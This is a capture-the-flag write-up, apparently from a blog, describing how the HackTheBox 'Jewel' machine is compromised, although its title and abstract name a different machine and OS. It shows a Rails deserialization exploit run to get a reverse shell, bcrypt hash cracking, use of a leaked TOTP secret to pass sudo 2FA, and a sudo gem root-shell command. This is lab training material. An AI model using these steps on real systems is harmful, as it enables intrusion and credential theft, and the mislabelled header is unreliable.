---
layout: post
title:  "HackTheBox Time Writeup" 
tags: hackthebox
categories: hackthebox active-machine 
rel-img: /assets/img/htb/time/time.png
description: Exploiting ruby on rails vulnerability to gain first access, escalating priviledge using google authenticator and take advantage to sudo and gem to conquer the machine!!
---

### Hackthebox TIme Writeup
![Jewel](/assets/img/htb/time/time.png)

## Abstract

Expoit OpenBSD vulnerabilities to conquer the machine!!

## Summary
1. Initial foothold
  - Nmap recon
  - gitweb enum
  - phusion passenger exploration
2. Ruby on Rails Deserialization Attack
3. User Flag
4. Priviledge Escalation
5. Root Flag

## Initial foothold

### Nmap recon

```
# Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-23 09:27 CEST
Nmap scan report for 10.10.10.211                                                                                                                                                                                                          
Host is up, received echo-reply ttl 63 (0.053s latency).                                                                                                                                                                                   
Scanned at 2020-10-23 09:27:54 CEST for 23s                                                                                                                                                                                                
Not shown: 997 filtered ports                                                                                                                                                                                                              
Reason: 997 no-responses                                                                                                                                                                                                                   
PORT     STATE SERVICE REASON         VERSION                                                                                                                                                                                              
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)                                                                                                                                                       
| ssh-hostkey:                                                                                                                                                                                                                             
|   2048 fd:80:8b:0c:73:93:d6:30:dc:ec:83:55:7c:9f:5d:12 (RSA)                                                                                                                                                                             
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDK1T+N61bTR89bPSsTtguCPwCtq5IAemU5F9VO6hSw8hnLrQ+3Bx6Cjci6MFx9RAMOS4xVtsmqtDvmjrtQ5hYuOYXlafsv6QU+6LJ+vImDSXiunRdpck3Z6f8sIEOOtiCJZ9HDiAzE62nolJPe2ObtU/Of627MiAksFh6+oBl/ZoWnveQwY7TLgFf19IhHV4Q9OPUlqeokiWiTazbvj5jC8vWcnl+DpN3xTuiTV8b+xUyXnFyO/MBaKhRGBbcbBwOsFVPc8NFyuyardVWEblS+p6B1QG6C62/o2Ft8x9lk1cYEDaFH+IfIUGhHykFQlA8+Y4qee8+OtRKrfwkVyxOr                                                                                        
|   256 61:99:05:76:54:07:92:ef:ee:34:cf:b7:3e:8a:05:c6 (ECDSA)                                                                                                                                                                            
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBgCpUS3ovp4tAKRfsFll+x5W6F28nQMhBrx06jDhK35Z10da2PX2vayLOniUTEsnb0hL/4phtNdI+QOKLPX+sg=                                                                         
|   256 7c:6d:39:ca:e7:e8:9c:53:65:f7:e2:7e:c7:17:2d:c3 (ED25519)                                                                                                                                                                          
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA9poXYE6YrgNaTFpdzYtMPUeSwB416uWFLSrT55iwv0                                                                                                                                                         
8000/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.38                                                                                                                                                                                  
|_http-generator: gitweb/2.20.1 git/2.20.1                                                                                                                                                                                                 
| http-methods:                                                                                                                                                                                                                            
|_  Supported Methods: GET HEAD POST OPTIONS                                                                                                                                                                                               
| http-open-proxy: Potentially OPEN proxy.                                                                                                                                                                                                 
|_Methods supported:CONNECTION                                                                                                                                                                                                             
|_http-server-header: Apache/2.4.38 (Debian)                                                                                                                                                                                               
| http-title: 10.10.10.211 Git                                                                                                                                                                                                             
|_Requested resource was http://10.10.10.211:8000/gitweb/                                                                                                                                                                                  
8080/tcp open  http    syn-ack ttl 63 nginx 1.14.2 (Phusion Passenger 6.0.6)
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.14.2 + Phusion Passenger 6.0.6
|_http-title: BL0G!
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 2.6.32 (91%), Crestron XPanel control system (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.16 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Linux 2.6.39 - 3.2 (86%), Infomir MAG-250 set-top box (86%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.80%E=4%D=10/23%OT=22%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=5F928611%P=x86_64-pc-linux-gnu)
SEQ(SP=104%GCD=1%ISR=10C%TI=Z%II=I%TS=A)
OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)
WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)
ECN(R=Y%DF=Y%TG=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
U1(R=N)
IE(R=Y%DFI=N%TG=40%CD=S)
```

Nmap revealed that port 22, 8000 and 8080 was open and SSH, Apache2 ,nginx webserver was respectively running on. Morevoer Nmap script gave information that webserver on 8000 was using gitweb 2.20.1 interface. 

### Gitweb enum

I started by searching for gitweb 2.21.1 available exploits but found nothing. Then i moved on enumerating gitweb web pages and found interesting file named bd.sql at URL http://10.10.10.211:8000/gitweb/?p=.git;a=blob;f=bd.sql;h=a7fddb693ca735f8aa1e4b09046cec2adddddc51;hb=HEAD, containing bill and jennifer user hashes:

`bill`:`$2a$12$uhUssB8.HFpT4XpbhclQU.Oizufehl9qqKtmdxTXetojn2FcNncJW`
`jennifer`:`$2a$12$ik.0o.TGRwMgUmyOR.Djzuyb/hjisgk2vws1xYC/hxw8M1nFk0MQy`

![gitweb file page](/assets/img/htb/jewel/jewel-gitweb.png)

I tried to crack these hashes but every attempt failed.

### Pushion Passenger exploration

So i decided to exploring web server on 8080 where Phusion Passenger 6.0.6 was running. I did not find any available eploit for this service, then i tried to register new account tthrough signup page:

![login page](/assets/img/htb/jewel/homepage-jewel.png)

After logging in i tried some attack but no luck. 

## Ruby on Rails Deserialization attack

After getting some hints from the HTB forum found that the ruby on rails version running on webserver was < 5.2.4.3 and it was vulnerable to deserialization attack (I found ruby on rails version at the URL http://10.10.10.211:8000/gitweb/?p=.git;a=commitdiff;h=5d6f436256c9575fbc7b1fb9621b18f0f8656741.

More information about this vulnerability can be found at Google Forum (https://groups.google.com/forum/#!topic/ruby-security-ann/OEWeyjD7NHY).

Following the PoC found at GitHub (https://github.com/masahiro331/CVE-2020-8165) and the python script created by @randomname83 i got reverse shell.

```
sh4ck@kali:~$ python3 exploit_poc_cve-2020-8165.py 10.10.10.211 10.10.14.83 4545

sh4ck@kali:~$ nc -nlvp 4545
listening on [any] 4545 ...
connect to [10.10.14.83] from (UNKNOWN) [10.10.10.211] 44778
bash: cannot set terminal process group (815): Inappropriate ioctl for device
bash: no job control in this shell
bill@jewel:~/blog$i
``` 

## User Flag

After upgrading full interactive shell i got user flag under home bill folder.

```
bill@jewel:~/blog$ python3 -c 'import pty;pty.spawn("/bin/bash")'
bill@jewel:~/blog$ export TERM=xterm
bill@jewel:~/blog$ cat user.txt
```
## Priviledge Escalation

Linpeas found two password hashes inside the file dump_2020-08-27.sql and bd.sql at /var/backups/ and /home/bill/blog/ respectively:

`jennifer` : `$2a$12$sZac9R2VSQYjOcBTTUYy6.Zd5I02OnmkKnD3zA6MqMrzLKz0jeDO`

`Unknown`: `$2a$12$uhUssB8.HFpT4XpbhclQU.Oizufehl9qqKtmdxTXetojn2FcNncJW`

Listing the content of dump_2020-08-27.sql file got another hash of user bill:

`bill`: `$2a$12$QqfetsTSBVxMXpnTR.JfUeJXcJRHv5D5HImL0EHI7OzVomCrqlRxW`

Tried to crack these hashes using john.

`$ sudo john --format=bcrypt creds.hash --wordlist=/usr/share/wordlists/rockyou.txt`

John has successfully cracked the hash and the credential is bill : spongebob. 

Tried to run the command $sudo -l  again to check any special privilege given to user bill, but it asked a Verification Code after entering the password. 
It appears that there is some two factor authentication enabled for normal users to run $sudo -l command. 
After some more enumeration got a hidden file google_authenticator inside the home directory (.google_authenticator). 
There is secret code inside this file which is 2UQI3R52WFCLE6JTLDCSJYMJH4, this code can be used to generate OTP.  
I have used authenticator addons for Firefox to generate OTP using this secret key. 

After addons installation and setting the OTP with secret key, i got otp time based number.

Copy the OTP and type the command $sudo -l then password spongebob then enter OTP as Verification code.
anyway i got some error. the issue was determinated bay time misalignment between remote server and my machine. So i had to set my machine time as per remote box. 
sudo -l revealed that user bill can run all the command using gem binary. 

```
bill@jewel:~/blog$ date
date
Mon 19 Oct 10:05:30 BST 2020
bill@jewel:~/blog$ sudo -l
sudo -l
[sudo] password for bill: spongebob

Verification code: 672111

Matching Defaults entries for bill on jewel:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    insults

User bill may run the following commands on jewel:
    (ALL : ALL) /usr/bin/gem
```

## Root Flag

From GTFOBIN found gem binary privilege escalation vector using Sudo Right Exploitation to get root. Let us get root shell and capture root flag.
Getting Root Shell

```
bill@jewel:~/blog$ sudo gem open -e "/bin/sh -c /bin/sh" rdoc
sudo gem open -e "/bin/sh -c /bin/sh" rdoc
# id
id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
```
